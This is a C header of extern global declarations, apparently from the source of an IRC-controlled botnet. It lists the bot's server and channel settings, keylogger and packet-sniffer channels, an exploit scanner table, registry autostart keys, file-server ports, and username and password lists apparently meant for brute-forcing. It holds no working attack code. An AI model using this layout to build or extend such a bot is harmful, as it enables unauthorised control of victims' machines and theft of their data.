// config extern globals for module use
extern char botid[];
extern char version[];
extern char password[];
extern char server[];
extern int port;
extern char serverpass[];
extern char channel[];
extern char chanpass[];
extern char server2[];
extern int port2;
extern char psniffchan[];		
//extern char keylogchan[];		
extern char exploitchan[];		
extern char channel2[];
extern char chanpass2[];
extern char filename[];
extern char valuename[];
extern char nickconst[];
extern char keylogfile[];
extern char szLocalPayloadFile[];
extern char modeonconn[];
extern char *authost[];
extern char *versionlist[];
extern char regkey1[];
extern char regkey2[];
extern char regkey3[];
extern char regkey4[];

extern int sock4port;
extern int tftpport;
extern int httpport;
extern int ftpport;

extern BOOL topiccmd;
extern BOOL rndfilename;
extern BOOL AutoStart;
extern BOOL CryptOutput;

extern char prefix;
extern int maxrand;

// global threads
extern thread threads[MAXTHREADS];

// url visit function
extern HANDLE ih;

// aliases
extern as aliases[MAXALIASES];
extern int anum;

// passwords
extern char *usernames[];
extern char *passwords[];

// advscan
extern EXPLOIT exploit[];

// misc
extern DWORD started;

// clones
extern clonestr clone_data[50];

#ifdef DEBUG_LOGGING
extern char logfile[];
#endif

#ifdef PLAIN_CRYPT
extern char key[];
#endif

